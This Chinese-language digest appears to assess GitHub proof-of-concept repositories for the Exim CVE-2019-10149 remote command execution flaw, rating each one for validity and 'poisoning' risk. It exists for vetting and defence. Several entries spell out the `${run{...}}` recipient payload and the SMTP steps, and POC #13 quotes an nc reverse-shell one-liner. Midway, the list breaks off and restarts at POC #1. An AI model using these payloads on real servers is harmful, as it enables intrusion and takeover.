4.  当 Exim 处理该邮件时，会执行嵌入在收件人地址中的恶意命令，从而导致远程代码执行。攻击者可以使用此漏洞来安装后门、窃取敏感信息或执行其他恶意操作。

**项目地址:** [aishee/CVE-2019-10149-quick](https://github.com/aishee/CVE-2019-10149-quick)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #10

**来源**: [CVE-2019-10149-bananaphones_exim-rce-quickfix.md](../2019/CVE-2019-10149-bananaphones_exim-rce-quickfix.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响版本的Exim，且漏洞未被修复

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，是由于 `deliver_message()` 函数中对接收者地址验证不当造成的远程命令执行漏洞。攻击者可以通过构造特殊的邮件，利用该漏洞在目标服务器上执行任意命令。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞的POC代码是有效的。搜索引擎结果显示该漏洞已被广泛利用，并且有活跃的Linux蠕虫利用此漏洞传播。漏洞利用代码中的 `exim_rce_fixer.sh` 脚本尝试更新 Exim 并移除恶意软件，表明存在利用该漏洞植入的恶意程序。

**投毒风险分析：**
提供的脚本 `exim_rce_fixer.sh` 旨在修复漏洞并清理恶意软件，但它本身可能存在投毒风险。脚本尝试删除与 `tor2web` 相关的恶意软件，更新 Exim，并删除可疑的 cron 任务和 authorized_keys 条目。但是，如果脚本未能完全清除恶意软件，或者脚本本身包含恶意代码，则可能导致系统受损。此外，脚本强制重启服务器，这可能导致数据丢失或服务中断。

`malware_do_not_run.sh` 脚本明确包含连接到 Tor 网络的行为，并尝试下载和执行恶意代码。尽管文件名暗示不要运行，但攻击者可以通过该脚本植入恶意软件。

综合考虑，脚本中清理恶意软件的部分看起来是合法的，但 `malware_do_not_run.sh` 脚本和`exim_rce_fixer.sh`脚本潜在的清理不完全和强制重启行为构成了投毒风险。

**利用方式：**
1.  攻击者构造包含恶意命令的特殊邮件。
2.  Exim 在处理邮件时，由于对接收者地址验证不当，将恶意命令传递给系统 shell 执行。
3.  攻击者从而在目标服务器上获得远程代码执行权限。
4.  攻击者可能利用该权限安装恶意软件，窃取数据，或控制服务器。

**项目地址:** [bananaphones/exim-rce-quickfix](https://github.com/bananaphones/exim-rce-quickfix)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #11

**来源**: [CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md](../2019/CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行存在漏洞的Exim版本，并且攻击者可以向Exim服务器发送邮件。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理（MTA）的 deliver_message() 函数中，由于对收件人地址的验证不当导致。未经身份验证的远程攻击者可以通过向目标服务器发送特制的邮件来利用此漏洞，从而在目标系统上执行任意命令。漏洞利用通常涉及在邮件收件人地址中注入 shell 命令。 

根据提供的漏洞利用代码，`/tmp/b373ced1c77bc05f74b9541e06f0010c/README.md`文件主要包含关于CVE-2019-10149、CVE-2019-15846 和 CVE-2019-16928漏洞的相关信息收集，包括漏洞公告、漏洞利用详情、问题时间线、NSA公告以及受影响的IP、ASN、国家和主机名等数据链接。其中`election-domains-by-expiration-date.txt`文件是域名列表, 不太可能直接用于漏洞利用，但是可能被用于信息收集或后续攻击。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在公开的漏洞利用代码，因此可以判断提供的漏洞利用代码是有效的。

**投毒风险：** 该仓库中存在的投毒代码可能性较低，主要是因为其内容以漏洞信息搜集为主，提供的数据源链接也是公开信息。`election-domains-by-expiration-date.txt`可能存在搜集来的恶意域名，但作者进行恶意添加的可能性较低。

**利用方式：** 攻击者构造包含恶意命令的邮件，利用Exim在处理收件人地址时的验证缺陷，将命令注入到系统执行。这通常通过在收件人地址中嵌入反引号或者其他命令执行符号来实现。该漏洞允许攻击者远程执行代码而无需身份验证。

**项目地址:** [cloudflare/exim-cve-2019-10149-data](https://github.com/cloudflare/exim-cve-2019-10149-data)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #12

**来源**: [CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md](../2019/CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程命令执行和系统被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** Exim服务对外开放，攻击者能够发送恶意构造的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，由于 `deliver_message()` 函数对接收者地址验证不当，攻击者可以通过发送特制的邮件，在目标服务器上执行任意命令。从提供的漏洞利用代码来看，利用方式主要有两种：

1.  **本地检测脚本 (eximioc.sh):**  此脚本用于在目标服务器本地运行，检测是否存在漏洞利用的迹象，例如检查Exim版本、cPanel版本以及是否存在异常进程 `kthrotlds`。

2.  **远程利用脚本 (eximrce.py):**  此脚本用于远程触发漏洞。它通过socket连接到目标服务器的Exim服务端口，发送包含恶意payload的邮件。Payload利用 `${run{...}}` 结构在服务器上执行命令，例如创建一个文件 `/root/lweximtest`。如果文件创建成功，则表明服务器存在远程命令执行漏洞。

**漏洞利用方式总结:**

*   攻击者构造包含恶意recipient地址的邮件。
*   邮件被发送到运行存在漏洞的Exim服务器。
*   Exim服务器在处理邮件时，由于recipient地址验证不当，执行了恶意payload中的命令。
*   攻击者在服务器上执行任意命令。

**投毒风险分析:**

提供的 `eximrce.py` 代码本身功能明确，旨在测试是否存在 CVE-2019-10149 漏洞。`eximioc.sh` 的目标也是检测漏洞和受攻击迹象。 但是依然存在以下风险，风险值给到10%。

*   **作者风险：** 从GitHub仓库直接下载并运行代码，存在一定的作者恶意投毒风险。例如，作者可能在脚本中添加隐藏的后门代码，在漏洞利用的同时，植入恶意程序。
*   **依赖风险：** `eximioc.sh` 脚本依赖 `expect` 和 `openssl` 命令。如果系统上安装的 `expect` 或 `openssl` 被篡改，则可能引入新的安全风险。
*   **维护风险：** 仓库如果长时间没有更新和维护，可能会被其他人恶意篡改，引入恶意代码。
*   **测试文件的影响:**虽然 `eximrce.py` 仅仅touch了一个文件,但是如果被滥用，将可能导致拒绝服务攻击。

**项目地址:** [cowbe0x004/eximrce-CVE-2019-10149](https://github.com/cowbe0x004/eximrce-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #13

**来源**: [CVE-2019-10149-darsigovrustam_CVE-2019-10149.md](../2019/CVE-2019-10149-darsigovrustam_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() 远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在漏洞影响范围内，允许外部连接到25端口(SMTP)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 漏洞存在于 Exim 邮件传输代理 (MTA) 的 `deliver_message()` 函数中，由于未正确验证收件人地址，攻击者可以通过构造特殊的电子邮件，在目标系统上执行任意命令。根据搜索结果，该漏洞已经被积极利用。提供的POC代码描述了如何利用该漏洞，包括安装易受攻击的Exim版本、配置、构造 payload 以及发送利用请求。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该POC代码是有效的。搜索结果表明该漏洞已被广泛利用，POC代码也提供了详细的利用步骤。POC代码中的安装步骤确保了在特定环境下漏洞的可复现性。

**投毒风险评估：**

初步分析POC代码仓库，`/tmp/a0abe20df178383d8f8296dfca6f85dc/RemoteConnection.sh` 脚本存在一定的投毒风险。该脚本使用 `tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 192.168.0.165 444 1> /tmp/1` 建立反向连接，这意味着攻击者（或脚本控制者）可以通过 `nc` 连接到受害者机器，并在受害者机器上执行命令。虽然脚本中明确提示需要修改IP和端口，但如果用户不修改就直接运行，将会连接到脚本作者控制的服务器。这种行为虽然不是传统意义上的恶意代码注入，但具有潜在的远程控制风险。

除此之外, `RemoteConnection.sh` 使用 `/tmp/1` 作为管道文件进行输入输出重定向,这可能导致数据泄露或覆盖。

因此，综合评估，投毒风险约为10%。大部分代码是用于漏洞利用，但反向连接部分存在被恶意利用的可能，用户需要仔细审查并修改脚本。

**利用方式分析：**

1.  **安装漏洞版本 Exim:**  首先，需要安装一个存在漏洞的 Exim 版本 (4.87 - 4.91)。
2.  **配置 Exim:**  为了方便利用，需要修改 Exim 的配置，允许 relaying，避免等待时间限制，并取消 recipient 验证。
3.  **构造 Payload:**  将要执行的 shell 命令转换为十六进制字符串，并将其嵌入到收件人地址中。Payload 的格式为 `<${run{<hex_encoded_command>}}@localhost>`。
4.  **发送恶意邮件：**
    *   使用 `nc` 连接到 Exim 服务器的 25 端口。
    *   发送 `HELO` 命令。
    *   设置发件人地址为 `<>`。
    *   设置收件人地址为构造好的 payload。
    *   发送 `DATA` 命令，并发送 31 行任意内容、一个空行和一个句点 (`.`) 来结束邮件内容。
5.  **执行命令：** Exim 在处理邮件时，会执行嵌入在收件人地址中的 shell 命令。

**项目地址:** [darsigovrustam/CVE-2019-10149](https://github.com/darsigovrustam/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #14

**来源**: [CVE-2019-10149-hyim0810_CVE-2019-10149.md](../2019/CVE-2019-10149-hyim0810_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行和系统完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行受影响版本的Exim，且攻击者能够通过网络连接到SMTP端口（通常是25端口）。配置不当，如允许任意relay，会降低利用难度。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149是Exim邮件传输代理（MTA）中的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对接收者地址的不正确验证。攻击者可以通过构造包含恶意命令的特殊邮件，利用该漏洞在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个已知的、被广泛讨论和利用的漏洞。漏洞利用代码提供了详细的利用步骤，包括：

1.  安装受影响版本的Exim（4.87-4.91）。
2.  修改Exim配置以允许relay（简化利用，否则需要等待7天）。
3.  使用netcat (nc) 连接到目标Exim服务器的25端口。
4.  通过SMTP协议发送特制的邮件，其中接收者地址包含要执行的命令（hex编码）。
5.  发送DATA命令和后续数据，触发漏洞。

**投毒风险分析：**

提供的漏洞利用代码中存在一定的投毒风险，但风险较低（约10%）。

主要风险点在于`RemoteConnection.sh`脚本。该脚本的功能是建立一个反向shell，将目标服务器上的`/tmp/1`文件的内容通过`nc`命令发送到攻击者的IP地址和端口。潜在的投毒方式可能包括：

*   **替换`/tmp/1`的内容：** 攻击者可以将恶意代码写入`/tmp/1`文件，并通过反向shell在攻击者机器上执行。
*   **`RemoteConnection.sh`本身的恶意代码：** 脚本可能包含一些隐藏的后门或恶意操作，例如收集系统信息、安装rootkit等。但这个可能性较低，因为脚本相对简单且功能明确。
*   **依赖攻击者服务器的风险：** 脚本依赖于从攻击者的服务器下载`RemoteConnection.sh`，如果攻击者控制的服务器被攻陷，或者攻击者修改了`RemoteConnection.sh`脚本的内容，可能会导致受害者执行恶意代码。

漏洞利用仓库中安装的Exim版本以及对`/usr/exim/configure`文件的修改，是为了简化利用流程，使其更容易被利用。这些修改本身不是投毒代码，但降低了利用门槛，可能导致漏洞被更广泛地利用。

**利用方式总结：**

1.  **目标环境准备：** 确保目标服务器运行着受影响版本的Exim（4.87-4.91）。
2.  **网络连接：** 攻击者需要能够通过网络连接到目标服务器的25端口。
3.  **Payload构造：** 攻击者需要将要执行的命令转换为十六进制编码，并将其嵌入到SMTP `RCPT TO` 命令的接收者地址中，格式为 `<${run{hex_encoded_command}}@localhost>`。
4.  **SMTP交互：** 攻击者使用SMTP协议与目标服务器进行交互，发送`HELO`、`MAIL FROM`、`RCPT TO` 和 `DATA` 等命令，触发漏洞。
5.  **代码执行：** 漏洞触发后，Exim会执行嵌入在接收者地址中的命令，攻击者从而获得对目标服务器的控制权。

**项目地址:** [hyim0810/CVE-2019-10149](https://github.com/hyim0810/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #15

**来源**: [CVE-2019-10149-qlusec_CVE-2019-10149.md](../2019/CVE-2019-10149-qlusec_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可远程执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive), 4.92受影响

**利用条件:** 目标系统运行存在漏洞的Exim版本，且允许接收邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当，导致攻击者可以通过构造特殊的邮件，在目标服务器上执行任意命令。

**有效性：**

提供的POC代码是有效的，它展示了如何利用此漏洞执行命令。POC中的 `payload.txt` 文件构造了一个包含嵌入命令的收件人地址。`rcpt to:` 字段包含一个`${run{...}}` 块，Exim 会执行该块中的命令。

**投毒风险：**

此仓库存在一定的投毒风险。虽然 `payload.txt` 文件展示了漏洞利用方法，但 `README.md` 文件内容过于简单，缺乏漏洞的详细说明和利用注意事项。此外，POC代码中包含反弹shell的操作，可能被用于恶意目的，如果攻击者替换了原有的反弹shell代码，风险较高。
综合评估投毒风险为10%。

**利用方式：**

1.  攻击者发送一封精心构造的邮件到目标 Exim 服务器。
2.  邮件的 `RCPT TO` 字段包含一个特殊的字符串，其中嵌入了要执行的命令。`${run{...}}`是一个常见的Exim宏扩展结构。
3.  当 Exim 处理该邮件时，由于漏洞的存在，它会执行嵌入在 `RCPT TO` 字段中的命令，该命令将执行反弹shell或其它恶意操作。
4.  命令执行结果被通过 `nc` 命令发送到攻击者的服务器。

**项目地址:** [qlusec/CVE-2019-10149](https://github.com/qlusec/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #16

**来源**: [CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md](../2019/CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md)

# CVE-2019-10149

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md](../2019/CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在4.87到4.91之间，需要网络访问25端口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理 (MTA) 的 deliver_message() 函数中，由于对接收者地址验证不当导致。攻击者可以通过发送特制的电子邮件，在目标服务器上执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的利用是有效的。POC代码 `wizard.py` 模拟了SMTP交互，利用`RCPT TO`命令中的`${run{...}}` 扩展功能，执行shell命令。

**投毒风险分析：**

检查提供的`wizard.py`文件，其中的payload经过了编码，目的是为了绕过一些检测机制。解码后的命令主要完成以下操作：

*   创建一个具有SUID权限的程序 `s`。
*   该程序 `s` 拥有root权限，执行后会启动一个root shell。
*   利用`${run{}}` 在服务器上执行编译命令，生成二进制文件s，并赋予SUID权限
*   POC的最后，执行该程序 `/tmp/s` 以获取root权限。

该POC旨在提升权限，而不是注入恶意代码到服务器的持久性位置，因此不属于传统的“投毒”行为。 投毒风险：0%

**利用方式：**

1.  攻击者连接到Exim服务器的25端口。
2.  发送HELO, MAIL FROM等SMTP命令进行初始化。
3.  利用 `RCPT TO` 命令，构造包含恶意命令的接收者地址，其中使用了 `${run{...}}` 扩展功能。
4.  发送DATA命令，提供邮件内容 (实际上邮件内容对利用该漏洞来说并不重要)。
5.  利用服务器执行`${run{}}`中的命令，该命令编译一个具有SUID的程序，攻击者执行该程序以获取root权限。

**项目地址:** [AzizMea/CVE-2019-10149-privilege-escalation](https://github.com/AzizMea/CVE-2019-10149-privilege-escalation)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #2

**来源**: [CVE-2019-10149-Brets0150_StickyExim.md](../2019/CVE-2019-10149-Brets0150_StickyExim.md)

## CVE-2019-10149 Exim RCE HoneyPot

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务运行且存在漏洞版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 4.87 到 4.91 版本中存在的一个远程代码执行漏洞。该漏洞源于 `deliver_message()` 函数中对接收者地址的不当验证，攻击者可以通过构造包含恶意命令的电子邮件，利用此漏洞在目标系统上执行任意代码。

**有效性评估：**

根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、被广泛讨论的严重漏洞，并且已经被实际利用。提供的漏洞利用代码实际上是一个蜜罐脚本，用于检测针对此漏洞的攻击尝试，而不是一个直接利用漏洞的 PoC。然而，README中提到了另一个PoC：`https://github.com/cowbe0x004/eximrce-CVE-2019-10149`， 可以验证漏洞。

**投毒风险评估：**

该仓库主要功能是做一个蜜罐，用于监控Exim漏洞(CVE-2019-10149)的攻击行为。

*   `install_StickyExim.sh`: 安装和配置蜜罐，包括Exim配置和Cron Job设置
*   `honey_harvester_exim_cve-2019-10149.sh`: 核心脚本，用于解析Exim日志，检测CVE-2019-10149攻击尝试，并发送告警邮件。

审查了安装脚本和核心检测脚本。发现主要功能是监控和告警，没有发现明显的恶意代码，考虑到代码会修改Exim配置以及加入Cron Job。存在一定的风险，但是风险较低。所以判断存在10%的投毒风险。

**利用方式分析：**

此PoC本身不是用于攻击的，而是用于创建一个蜜罐来捕获攻击流量。 但是根据漏洞描述，利用方式大致如下：

1.  攻击者构造一封特殊的电子邮件，该邮件的接收者地址包含恶意命令。
2.  当 Exim 处理这封邮件时，`deliver_message()` 函数未能正确验证接收者地址，导致恶意命令被执行。
3.  攻击者可以通过这种方式在服务器上执行任意代码，从而控制服务器。

**总结：**

该漏洞是一个严重的安全漏洞，可以允许未经身份验证的远程攻击者在受影响的 Exim 服务器上执行任意代码。需要尽快修补此漏洞。

**项目地址:** [Brets0150/StickyExim](https://github.com/Brets0150/StickyExim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #3

**来源**: [CVE-2019-10149-Chris-dev1_exim.exp.md](../2019/CVE-2019-10149-Chris-dev1_exim.exp.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致完全控制受影响的服务器

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响的Exim版本，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中。这是一个远程命令执行漏洞，由于 `deliver_message()` 函数中对接收者地址的验证不当，导致攻击者可以通过发送特制的电子邮件来执行任意命令。漏洞利用方式通常涉及构造包含恶意命令的电子邮件地址，这些命令会在 Exim 处理邮件时被执行。从搜索结果和漏洞库信息来看，此漏洞已被广泛利用。提供的代码片段仅为Apache License 2.0协议，不包含任何漏洞利用或恶意代码。因此，可以判断投毒风险为0%。根据搜索结果，漏洞利用代码已经公开。

**项目地址:** [Chris-dev1/exim.exp](https://github.com/Chris-dev1/exim.exp)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #4

**来源**: [CVE-2019-10149-Diefunction_CVE-2019-10149.md](../2019/CVE-2019-10149-Diefunction_CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标服务器运行存在漏洞的Exim版本，且允许外部连接到SMTP端口（默认25端口）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。漏洞原因是Exim在`deliver_message()`函数中对收件人地址的验证不当，攻击者可以通过构造特殊的邮件收件人地址，在服务器上执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞是真实存在的，且有可用的POC代码。搜索引擎结果中多个链接（例如Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire, RedHat）都确认了此漏洞的存在和高危性。CISA已将此漏洞加入已知被利用的漏洞目录(KEV)。提供的PoC脚本也证实了利用方法的可行性。

**投毒风险：**
分析提供的`exploit.py`代码，该脚本主要功能是利用SMTP协议与目标Exim服务器进行交互，构造包含恶意命令的收件人地址，从而实现远程命令执行。脚本的主要步骤包括：
1.  建立socket连接到目标服务器的25端口
2.  发送EHLO命令
3.  发送MAIL FROM命令
4.  发送RCPT TO命令，其中收件人地址包含`${run{...}}`结构，用于执行命令
5.  发送DATA命令
6.  发送包含一系列Received头的邮件正文，最后以".\r\n"结束

检查脚本代码，没有发现任何可疑的、与漏洞利用无关的代码。payload部分通过字符串格式化，将反弹shell命令注入到收件人地址中。因此，可以认为此仓库中作者隐藏投毒代码的可能性为0%。

**利用方式：**
1.  **前期准备：** 攻击者需要一台可以访问目标服务器的机器，并且需要知道目标服务器的IP地址和SMTP端口（通常是25）。攻击者还需要监听一个端口，用于接收目标服务器反弹的shell。
2.  **漏洞利用：** 攻击者运行提供的`exploit.py`脚本，指定目标服务器的IP地址、SMTP端口、攻击者自己的IP地址和监听端口。
3.  **远程命令执行：** 脚本会构造一个包含恶意命令的邮件，发送给目标服务器。当Exim处理该邮件时，会执行恶意命令，通常是反弹shell。
4.  **获取shell：** 攻击者在自己的机器上接收到反弹的shell，从而控制目标服务器。

**项目地址:** [Diefunction/CVE-2019-10149](https://github.com/Diefunction/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #5

**来源**: [CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md](../2019/CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标Exim服务器监听25端口，并且存在漏洞版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于Exim的 deliver_message() 函数中，由于对接收者地址验证不当，可能导致远程命令执行。攻击者可以通过构造特殊的邮件，在接收者地址中注入恶意命令，从而在目标服务器上执行任意代码。

**有效性评估：**
根据漏洞库信息和搜索结果，CVE-2019-10149 是一个已被确认的、高危的远程命令执行漏洞。多个安全厂商和研究人员已经发布了相关的分析和PoC代码。

**投毒风险评估：**
提供的PoC代码只有一个README.md文件，内容是关于漏洞的SNP分配，本身不包含任何可执行的代码，因此直接投毒的概率较低。但是，PoC代码仓库可能包含其他未列出的恶意文件或依赖项，所以仍然存在一定的投毒风险。根据目前的信息，投毒风险估计为10%。更完善的分析需要检查所有文件和依赖。

**利用方式：**
1.  攻击者向目标 Exim 服务器发送一封特制的电子邮件。
2.  该邮件的接收者地址中包含恶意构造的命令注入代码。
3.  当 Exim 处理该邮件时，由于 deliver_message() 函数的验证缺陷，恶意命令会被执行。
4.  攻击者从而获得目标服务器的远程代码执行权限，可以执行任意操作，如安装后门、窃取数据等。

**排序优先级说明：** 遵循 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 原则。


**项目地址:** [Dilshan-Eranda/CVE-2019-10149](https://github.com/Dilshan-Eranda/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #6

**来源**: [CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md](../2019/CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制受影响的服务器

**影响版本:** 4.87 - 4.91

**利用条件:** 需要 Exim 服务在目标机器上运行，且版本在受影响范围内，可能需要目标服务器开放25端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 邮件服务器中存在的远程命令执行漏洞。该漏洞是由于 `deliver_message()` 函数中对收件人地址的不正确验证引起的。攻击者可以通过发送特制的电子邮件利用此漏洞，从而在服务器上以 root 权限执行任意命令。

**有效性评估：**

提供的 PoC 代码 `PoC_CVE-2019-10149.py` 看起来有效。它通过 SMTP 协议与 Exim 服务器建立连接，并发送包含恶意命令的电子邮件。该命令嵌入在收件人地址中，利用了 Exim 的字符串扩展功能来执行命令。

多个来源（Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire）确认了该漏洞的存在和严重性，并指出该漏洞已被积极利用。

**投毒风险评估：**

该 PoC 代码本身相对简单，主要功能是利用漏洞执行命令。投毒的潜在风险较低，但并非完全没有。

*   **编码风险：** 代码中包含hex编码，降低了代码可读性，可能存在隐藏代码，如果hex编码混淆了正常的指令与后门代码，存在一定的风险。
*   **依赖风险：** 该脚本依赖Python3和socket，确保环境安全。
*   **维护者风险：**虽然README.md声明免责声明，但依旧存在风险，需要保持警惕。

综合考虑，该仓库的投毒风险评估在10%。

**利用方式分析：**

1.  **目标确认：** 确认目标系统运行着受影响版本的 Exim（4.87 到 4.91）。
2.  **SMTP 连接：** 使用 PoC 脚本通过 SMTP 协议连接到目标 Exim 服务器的 25 端口（或其他配置的端口）。
3.  **构造恶意邮件：** PoC 脚本构造一封包含恶意收件人地址的电子邮件。该地址利用 Exim 的字符串扩展功能来执行命令。
4.  **发送邮件：** 将构造的邮件发送到目标 Exim 服务器。
5.  **命令执行：** 如果漏洞利用成功，Exim 将以 root 权限执行嵌入在收件人地址中的命令。

**缓解措施：**

*   升级 Exim 到受影响版本之外的版本(>=4.92)。
*   禁用 Exim 的字符串扩展功能（如果可能）。
*   使用防火墙限制对 Exim 端口的访问。

**项目地址:** [MNEMO-CERT/PoC--CVE-2019-10149_Exim](https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #7

**来源**: [CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md](../2019/CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** 4.87-4.91

**利用条件:** 目标系统运行受影响版本的Exim，且允许从攻击者主机到目标机器25端口的TCP连接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim 4.87到4.91版本中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以利用此漏洞，通过构造包含恶意命令的特殊邮件，在目标系统上执行任意代码，从而完全控制系统。

**有效性分析：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，可以确认此漏洞是真实存在的，并且PoC代码可以有效利用此漏洞。

**投毒风险分析：**
PoC代码通过`nc`在目标机器上反弹shell，监听31415端口。代码本身目的是利用漏洞，没有发现隐藏的恶意代码或后门，因此投毒风险较低，为0%。

**漏洞利用方式：**
1.  PoC首先通过`nc`连接到目标Exim服务器的25端口（SMTP）。
2.  发送`HELO`命令，声明客户端主机名。
3.  发送`MAIL FROM`命令，指定发件人地址。
